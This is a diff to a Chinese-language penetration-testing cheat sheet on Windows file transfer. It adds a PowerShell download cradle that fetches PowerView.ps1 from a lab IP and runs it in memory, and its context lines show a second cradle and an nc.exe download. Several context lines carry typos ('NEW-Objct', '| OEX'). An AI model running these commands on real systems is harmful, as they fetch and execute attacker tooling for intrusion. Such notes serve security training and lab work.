@@ -106,6 +106,12 @@ IEX(NEW-Objct Net.WebClient).DownloadString('<URL>')
 Invoke-WebRequest -Uri 'http://10.10.16.58/nc.exe' -OutFile 'C:\Utils\nc.exe' -UseBasicParsing | OEX
 ```
 
+#### 直接加载在会话中
+
+```PowerShell
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.15:8000/PowerView.ps1')
+```
+
 #### FTP 下载
 
 需要 Python3 的模块 `pyftpdlib`。
